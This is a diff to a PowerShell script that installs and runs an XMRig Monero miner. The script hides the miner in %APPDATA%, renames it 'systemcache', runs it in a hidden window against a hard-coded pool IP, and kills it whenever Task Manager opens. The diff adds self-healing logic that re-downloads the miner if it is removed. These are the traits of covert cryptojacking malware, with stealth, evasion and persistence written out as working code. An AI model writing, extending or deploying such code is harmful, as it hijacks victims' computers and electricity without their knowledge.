@@ -1,5 +1,5 @@
 # ================================
-# StartMining.ps1 - Full Miner Installer and Watchdog
+# StartMining.ps1 - Self-Healing Installer + Watchdog
 # ================================
 $AppData = $env:APPDATA
 $MinerDir = "$AppData\XMRigMiner"
@@ -14,28 +14,7 @@ $Pool = "159.203.162.18:3333"
 $Password = "x"
 $LogFile = "$MinerDir\miner.log"
 
-# Create miner folder
-if (!(Test-Path $MinerDir)) {
-    New-Item -ItemType Directory -Path $MinerDir | Out-Null
-}
-
-# Download XMRig
-if (!(Test-Path $MinerPath)) {
-    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
-
-    Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath
-
-    $XmrigOriginal = Get-ChildItem "$ExtractPath\xmrig-$MinerVersion\xmrig.exe" -Force | Select-Object -ExpandProperty FullName
-    $TargetDir = "$MinerDir\xmrig-$MinerVersion"
-    if (Test-Path $TargetDir) { Remove-Item $TargetDir -Recurse -Force }
-    Move-Item "$ExtractPath\xmrig-$MinerVersion" $TargetDir
-
-    Rename-Item "$TargetDir\xmrig.exe" $ExeName
-    Remove-Item $ZipPath -Force
-    Remove-Item $ExtractPath -Recurse -Force
-}
-
-# GPU detection
+# GPU detection (once)
 $gpuArgs = ""
 $gpus = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name
 foreach ($gpu in $gpus) {
@@ -43,11 +22,34 @@ foreach ($gpu in $gpus) {
     elseif ($gpu -like "*amd*" -or $gpu -like "*radeon*") { $gpuArgs = "--opencl --opencl-threads=1 --opencl-launch=64x1" }
 }
 
-# Build arguments
+# Build arguments (once)
 $arguments = "--algo randomx --url $Pool --user $Wallet --pass $Password --randomx-no-numa --randomx-mode=light --no-huge-pages --threads=1 --cpu-priority=0 --donate-level=1 --no-color --log-file `"$LogFile`" --api-port 0 $gpuArgs"
 
-# Watchdog loop
+# Watchdog loop with self-healing
 while ($true) {
+    # Reinstall if EXE or folder is missing
+    if (!(Test-Path $MinerPath)) {
+        try {
+            if (!(Test-Path $MinerDir)) {
+                New-Item -ItemType Directory -Path $MinerDir | Out-Null
+            }
+
+            Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing
+            Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath -Force
+
+            $TargetDir = "$MinerDir\xmrig-$MinerVersion"
+            if (Test-Path $TargetDir) { Remove-Item $TargetDir -Recurse -Force }
+            Move-Item "$ExtractPath\xmrig-$MinerVersion" $TargetDir
+
+            Rename-Item "$TargetDir\xmrig.exe" $ExeName
+            Remove-Item $ZipPath -Force
+            Remove-Item $ExtractPath -Recurse -Force
+        } catch {
+            Start-Sleep -Seconds 10
+            continue
+        }
+    }
+
     $isTaskmgr = Get-Process | Where-Object { $_.Name -eq "Taskmgr" }
     $isMiner = Get-Process | Where-Object { $_.Name -eq "systemcache" }
 
@@ -56,7 +58,7 @@ while ($true) {
             Stop-Process -Name "systemcache" -Force
         }
     } else {
-        if (-not $isMiner) {
+        if (-not $isMiner -and (Test-Path $MinerPath)) {
             Start-Process -FilePath $MinerPath -ArgumentList $arguments -WindowStyle Hidden
         }
     }
